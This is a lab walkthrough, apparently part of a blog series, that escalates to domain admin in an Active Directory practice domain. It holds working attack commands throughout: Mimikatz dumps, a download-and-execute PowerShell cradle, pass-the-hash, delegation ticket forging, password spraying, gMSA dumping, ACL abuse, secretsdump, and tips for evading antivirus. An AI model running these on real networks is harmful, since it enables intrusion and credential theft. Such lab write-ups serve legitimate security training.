## Introduction
In the previous one, we pivoted from one machine to another using the `GenericAll` privileges over a container and then using RBCD to successfully generate a ticket that gave us the keys as Administrator to the `WEB$` machine. In this one we are going to see how we can go from there to other machines. The goal here is to reach domain admin in this domain and then do some trust hax and jump to any other forest that there might be (there is. this should have been covered by the reader in the previous posts when we got iniital access to the domain.) 

## Harvesting Creds
Before going nay further, we will make sure not to lose access. For that I'll run the same modified `Invoke-Mimikatz.ps1` script. I have added the following lines in the end of the script.
```bash
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command "token::elevate lsadump::sam exit"
Invoke-Mimikatz -Command "token::elevate sekurlsa::ekeys exit"
```

So using the same command we can dump some hashes.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.58.50/safedogz.ps1') -UseBasicParsing | iex"
```
![WEB Hashes](/assets/img/NHA/web_hashes.png)

Notably, we get the follwoing hashes that we need to save.
```
Administrator:0c532fcf2046010cb8d38eedf5e45312
frank:d4fad93561dee253398d5891e991a6fb
WEB$:1cee40630bb1fe3f4ae2adfc6e7ec977
```

With this, we seem to have a user account. One we didn't have previously. We can try to see what this account can access using this command.
```bash
netexec smb 192.168.58.0/24 -u frank -H d4fad93561dee253398d5891e991a6fb
```

![Frank Hash](/assets/img/NHA/frank_hash.png)

We can use `evil-winrm` to login to any of these machines and confirm our access.
```bash
evil-winrm -i 192.168.58.21 -u frank -H d4fad93561dee253398d5891e991a6fb
``` 

![Frank Web Access](/assets/img/NHA/frank_web.png)

## BloodHound to the rescue (again...)
After this, we can try to find something interesting in the machines itself, locating passwords from browsers etc. and such. I have tried it. Couldn't find anything worth while. We can move over to BloodHound again. We can start by marking assets that we have access to now as owned. Then map a path from the owned principles to other assets in the domain. While doing it for `SHARE$` machine, I can see that user `frank` has a right to delegate to that machine.
We can confirm this by using this command.
```bash
findDelegation.py academy.ninja.lan/frank -hashes d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb -dc-ip 192.168.58.20
```

![List Delegations](/assets/img/NHA/delegations.png)

This shows us that user `frank` has Constrained Delegation with Protocol Transition rights for the `eventlog` service. This can be read about [here](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/constrained#with-protocol-transition).
As seen here, `frank` has the rights to the service `eventlog`. This can be misused by creating a service ticket by using the user `frank` which will impersonate `Administrator` to the service `eventlog`. But we will also provide a diferent service using the `altservice` flag of `CIFS` which will help us access the file system or use tools like `PSExec` or `SMBExec`. This happens because the service name part of the ticket is not protected so we can change it whatever we like.
One thing to note, the original Impacket's `getST.py` will not have the option for `altservice`. You can use [this](https://github.com/ShutdownRepo/impacket/tree/getST) to get the one with this flag.

```bash
/opt/impacket-getst/examples/getST.py -spn 'eventlog/share' -altservice 'cifs/share' -impersonate Administrator -dc-ip 'academy.ninja.lan' "academy.ninja.lan"/"frank" -hashes d4fad93561dee253398d5891e991a6fb:d4fad93561dee253398d5891e991a6fb
```

![Asking Service Ticket](/assets/img/NHA/constrained.png)

After this we can export it and see if it works using `SMBExec.py`
```bash
export KRB5CCNAME=Administrator@cifs_share@ACADEMY.NINJA.LAN.ccache

smbexec.py @share -k -no-pass -dc-ip 192.168.58.20 -target-ip 192.168.58.23
```


![Shell on SHARE](/assets/img/NHA/share_shell.png)

On thing to mention, the usual Impacket was immediately getting detected. But for some reason Impacket for Exegol was not. That worked fine. You can find that [here](https://github.com/ThePorgs/impacket).
After moving it to our C2, we can look around for some thing interesting. I found a `bot.ps1` script that contains the password of `frank` user.

![Frank Password](/assets/img/NHA/frank_pass.png)

We can try to spray this password over all the users in the domain to find if we can find another user with this same password.
```bash
netexec smb 192.168.58.20 -u creds/academy_users.txt -p 'Il0ve!R4men_<3' --continue-on-success
``` 

![Password Spray](/assets/img/NHA/spray.png)

## GMSA Dumping
That doesn't give us much. We can move back to BloodHound to check what we can find. By looking around, we can find that the machine we just got into has the ability to read GMSA password of the `gmsaNFS$` machine. This is, as the name suggests, a NFS or a file share account which is a machine account.

![GMSANFS$ Path](/assets/img/NHA/gmsa.png)

For this, we would need the machine account hash for `SHARE$`. After aquiring the hash we can use `gMSADumper.py` to confirm that `SHARE$` can read the password. For some reason it was not dumping the password itself.
```bash
python /opt/gMSADumper/gMSADumper.py -u SHARE$ -p 791782105dd864621fbbf9e0fbed9fc7:791782105dd864621fbbf9e0fbed9fc7 -d academy.ninja.lan -l dc-ac.academy.ninja.lan
```

At this point, the default havoc payload was not working. [This](https://github.com/Maldev-Academy/MaldevAcademyLdr.1) is my new best friend (lowkey waiting for a discount or a giveaway...). If after access its giving you troubles, you can always remove the defender definitions to make eveything else be nice.

![GMSANFS$ Read](/assets/img/NHA/gmsa_share.png)

We can use [this](https://github.com/rvazarkar/GMSAPasswordReader) to dump the passwords instead using havoc.
```bash
dotnet inline-execute /opt/Toolies/GMSAPasswordReader.exe --AccountName gmsaNFS$
```

And we get the hashes.

![Dumped GMSANFS$](/assets/img/NHA/dump_gmsa.png)

## ACL Pwning

Having a look in BloodHound we can see that the machine `SHARE$` has an ACL `ForceChangePassword` over the backup user. We can use PowerView to do this.
```bash
IEX(New-Object Net.WebClient).downloadString('http://192.168.58.50/PowerView.ps1')

$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'backup' -AccountPassword $NewPassword
```

After this, we canfirm it using `netexec`
```bash
netexec smb 192.168.58.20 -u backup -p 'Password123!'
```

![Backup User](/assets/img/NHA/backup_user.png)


## Over to the Domain Admin

Back to good ol' bloodhound. We can see that this user basicallty carries the keys to the domain.

![Backup Bloodhound](/assets/img/NHA/backup_blood.png)

We can again confirm that using `owneredit.py` from the ShutDownRepo fork of `impacket`.
```bash
/opt/impacket-getst/examples/owneredit.py -action read -target 'Domain Admins' academy.ninja.lan/backup:'Password123!'
```


We can use this to change the owner of the Domain Admins group to `backup` as well.
```bash
/opt/impacket-getst/examples/owneredit.py -action write -new-owner 'backup' -target 'Domain Admins' academy.ninja.lan/backup:'Password123!'
```


Once that is done we can easily update the user `backup` to have `GenericAll` privileges over the `Domain Admins` group using `dacledit.py`.
```bash
dacledit.py -action 'write' -rights 'FullControl' -principal backup  -target 'Domain Admins' 'academy.ninja.lan'/'backup':'Password123!' 
```


This can again be confirmed using BloodHound dump.
```bash
bloodhound-python -c all -d academy.ninja.lan -v -u backup -p 'Password123!' -ns 192.168.58.20 --zip
```

Once that is confirmed, the only thing remaining is really just adding ourselves in the `Domain Admins` group.
```bash
net rpc group addmem 'Domain Admins' backup -U academy.ninja.lan/backup -S 192.168.58.20
```


Confirming it works.
![Backup Domain Admin](/assets/img/NHA/backup_domainadmin.png)


With all this out of the way, we can finally dump the domain secrets using `secretsdump.py` and pwn the whole domain.
```bash
impacket-secretsdump 'academy.ninja.lan'/'backup':'Password123!'@192.168.58.20 -dc-ip 192.168.58.20 -outputfile domain
```

Finally, we can log in to the domain controller to confirm.

This marks the end of the third post with us being the domain administrator in the domain. But the work is not finished. In the next one we will move from this domain to the other domain in the trust relationship. Let me know if I missed or messed up a step. Be happy to help!
